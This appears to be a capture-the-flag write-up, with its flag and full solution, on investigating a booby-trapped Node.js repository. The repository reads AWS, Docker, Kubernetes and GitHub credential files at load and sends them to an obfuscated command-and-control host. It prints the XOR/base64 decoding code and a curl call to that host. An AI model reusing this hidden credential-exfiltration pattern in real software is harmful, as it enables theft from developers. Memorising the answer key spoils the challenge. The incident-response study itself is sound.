# Task 1 — The Merge

Difficulty: Medium
Category: Source Code Review + Live Interaction
Flag: SecurinetsENIT{5a005bab5fed4fc5bf3e56259ed0e284}

## Scenario

A developer at a small startup cloned a public Node.js project from GitHub
to help debug it. Two days after they ran the app, their cloud provider
notified them that their API credentials had been used from an IP in a
foreign country.

The startup's IR team cloned the same repo for analysis.

## Evidence

One thing. A GitHub repo URL.

    https://github.com/john-milner/meterex

## Walkthrough

### Step 1 — Clone and get oriented

    git clone https://github.com/john-milner/meterex.git
    cd meterex
    find . -type f -not -path "./.git/*" | sort

Normal Node.js project layout. README, CHANGELOG, LICENSE, docs/,
scripts/, src/, package.json.

Nothing jumps out. The repo describes itself as a lightweight metrics
dashboard library called metrex.

### Step 2 — Read the source

    cat src/index.js
    cat src/server.js
    cat src/lib/metrics.js
    cat src/lib/utils.js
    cat src/lib/queue.js
    cat src/lib/transport.js

Notice the bare require('./lib/utils') near the top of src/server.js.
That is the trigger.

src/lib/utils.js reads a handful of local config files — ~/.aws/credentials,
~/.docker/config.json, ~/.kube/config, ~/.config/gh/hosts.yml — and then
calls queue.enqueue(getSnapshot()) at module load.

src/lib/queue.js contains the obfuscated C2 parameters.

src/lib/transport.js builds and sends the request.

### Step 3 — Decode the domain

queue.js has two base64 fragments, an XOR key schedule, and a decoder:

    function fragmentA() { return Buffer.from('LXLBMnjMMTo=', 'base64'); }
    function fragmentB() { return Buffer.from('KHLPO26NOXvML3M=', 'base64'); }

    const K0 = 0x5a;
    const K1 = 0x17;
    const K2 = 0xa3;

    function rot(buf, k0, k1, k2) {
      const out = Buffer.alloc(buf.length);
      for (let i = 0; i < buf.length; i++) {
        const k = i % 3 === 0 ? k0 : i % 3 === 1 ? k1 : k2;
        out[i] = buf[i] ^ k;
      }
      return out;
    }

    function decodeHost() {
      const a = rot(fragmentA(), K0, K1, K2);
      const b = rot(fragmentB(), K0, K1, K2);
      return Buffer.concat([a, b]).toString('utf8');
    }

Reverse it in Python:

    import base64
    def rot(d, k0=0x5a, k1=0x17, k2=0xa3):
        o = bytearray()
        for i, b in enumerate(d):
            o.append(b ^ [k0, k1, k2][i % 3])
        return bytes(o)
    a = base64.b64decode('LXLBMnjMMTo=')
    b = base64.b64decode('KHLPO26NOXvML3M=')
    print((rot(a) + rot(b)).decode())
    # webhook-relay.cloud

### Step 4 — Decode the token

    const TOKEN_A = '74656c656d657472795f323032';
    const TOKEN_B = '365f7265706f72745f61633033';

    function decodeToken() {
      return Buffer.from(TOKEN_A + TOKEN_B, 'hex').toString('utf8').toLowerCase();
    }

Reverse:

    python3 -c "print(bytes.fromhex('74656c656d657472795f323032' + '365f7265706f72745f61633033').decode().lower())"
    # telemetry_2026_report_ac03

### Step 5 — Decode the path

    const PATH_REVERSED = 'tsegni/yrtsmelet/2v/ipa/';

    function endpoint() {
      return PATH_REVERSED.split('').reverse().join('');
    }

Reverse:

    python3 -c "print('tsegni/yrtsmelet/2v/ipa/'[::-1])"
    # /api/v2/telemetry/ingest

### Step 6 — Decode the header name

transport.js:

    const KNOWN_HEADERS = new Set([
      'X-Trace-Id', 'X-Request-Id', 'X-Correlation-Id',
      'X-Forwarded-For', 'X-Real-IP', 'X-Analytics-Signature'
    ]);

    function pickHeader() {
      let sum = 0;
      for (const h of KNOWN_HEADERS) sum += h.length;
      return [...KNOWN_HEADERS][sum % KNOWN_HEADERS.size];
    }

Compute:

    python3 -c "
    h = ['X-Trace-Id','X-Request-Id','X-Correlation-Id','X-Forwarded-For','X-Real-IP','X-Analytics-Signature']
    print(h[sum(len(x) for x in h) % len(h)])
    "
    # X-Analytics-Signature

### Step 7 — Get the body shape

transport.js builds the request:

    const body = JSON.stringify({
      v: 2,
      seq: Date.now(),
      type: 'telemetry.report',
      src: 'dashboard',
      payload: Buffer.from(JSON.stringify(msg.body)).toString('base64')
    });

The server only checks that type equals "telemetry.report" and that payload
exists as a string. Everything else is cosmetic.

### Step 8 — Send the request

    curl -X POST https://webhook-relay.cloud/api/v2/telemetry/ingest \
      -H "Content-Type: application/json" \
      -H "X-Analytics-Signature: telemetry_2026_report_ac03" \
      -d '{
        "v": 2,
        "seq": 1760000000000,
        "type": "telemetry.report",
        "src": "dashboard",
        "payload": "eyJ0ZXN0Ijp0cnVlfQ=="
      }'

Response:

    {
      "status": "accepted",
      "correlation_id": "b3f8c2a1-7d4e-4f9b-8a2c-6d1e5f0a9b3c",
      "config": "SecurinetsENIT{5a005bab5fed4fc5bf3e56259ed0e284}",
      "interval": 300
    }

### Step 9 — Note the fallback

Try a wrong token:

    curl -I -X POST https://webhook-relay.cloud/api/v2/telemetry/ingest \
      -H "X-Analytics-Signature: wrong"

You get a 302 to https://www.npmjs.com/. Any incorrect request gets
redirected. The C2 looks like a harmless webhook relay to a casual observer.

## Flag

SecurinetsENIT{5a005bab5fed4fc5bf3e56259ed0e284}

## What you learn

- Code review of a moderately sized Node.js project
- Recognizing obfuscation: XOR with a rotating key, base64 fragments,
  hex splits, reversed strings
- Following a require() chain across files
- Reconstructing an HTTP request from source
- Understanding that telemetry and analytics are common attack surfaces

## MITRE

T1195.001 — Supply Chain Compromise: Software Dependencies
T1005 — Data from Local System
T1555 — Credentials from Password Stores
T1567 — Exfiltration Over Web Service
T1071.001 — Application Layer Protocol: Web Protocols
